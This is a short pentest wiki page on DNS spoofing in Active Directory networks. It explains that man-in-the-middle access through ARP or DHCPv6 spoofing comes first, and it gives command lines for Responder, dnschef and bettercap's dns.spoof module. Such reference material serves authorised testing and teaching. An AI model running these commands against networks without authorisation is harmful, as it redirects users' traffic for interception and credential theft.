---
authors: ShutdownRepo, sckdev
category: ad
---

# DNS spoofing

## Theory

DNS is not multicast or broadcast like [LLMNR, NBT-NS or mDNS](llmnr-nbtns-mdns-spoofing.md). In order to answer DNS requests, attacker first need to receive them. For instance, this can be achieved with [ARP spoofing](arp-poisoning.md) or [DHCPv6 spoofing](dhcpv6-spoofing.md). DNS spoofing is basically setting up a DNS server and answering DNS queries obtained through man-in-the-middle technique.

## Practice

::: tabs

=== Responder

[Responder](https://github.com/SpiderLabs/Responder)'s (Python) DNS server feature can be used to answer DNS queries.

```bash
responder --interface "eth0"
responder -I "eth0"
```


=== dnschef

[dnschef](https://github.com/iphelix/dnschef) (Python) can be used as a DNS server. 

```bash
dnschef --fakeip 'Pentest_IP_Address' --interface 'Pentest_IP_Address' --port 53 --logfile dnschef.log
```


=== bettercap

In order to spoof DNS requests, [bettercap](https://www.bettercap.org/) (Go) can be used. This tool can also be used for the first step of [ARP spoofing](arp-poisoning.md) or [DHCPv6 spoofing](dhcpv6-spoofing.md). 

```bash
set dns.spoof.domains $DOMAIN_FQDN
set dns.spoof.all true
dns.spoof on
```

:::


## Resources

[https://www.bettercap.org/modules/ethernet/spoofers/dns.spoof/](https://www.bettercap.org/modules/ethernet/spoofers/dns.spoof/)